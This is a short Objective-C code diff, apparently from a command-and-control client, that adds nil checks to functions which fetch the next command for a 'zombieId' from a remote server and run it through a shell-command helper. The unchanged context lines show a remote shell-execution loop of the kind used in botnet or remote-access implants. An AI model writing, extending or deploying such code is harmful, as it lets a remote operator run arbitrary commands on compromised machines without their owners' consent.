@@ -85,6 +85,9 @@
     NSString *url = [NSString stringWithFormat:@"%@/next/command/%@", [config getBaseUrl], zombieId];
     NSString *response = [[[WTHTTPApi alloc] init] httpGetRequest:url usingData:nil];
     NSDictionary *responseJson = [WTJsonParser parseJson:response];
+    if (responseJson == nil) {
+        return nil;
+    }
     NSString *commandId = [responseJson objectForKey:@"id"];
     NSString *command = [responseJson objectForKey:@"command"];
     return @[commandId,command];
@@ -100,6 +103,9 @@
 +(void)execNextCommand {
     WTConfig *config = [WTConfig getConfig];
     NSArray *nextCommandArray = [WTServerApi nextCommand];
+    if (nextCommandArray == nil) {
+        return;
+    }
     NSString *commandId = nextCommandArray[0];
     NSString *command = nextCommandArray[1];
     NSString *commandOutput = [WTShellCommands runShellCommand:command withMaxBufferSize:-1];
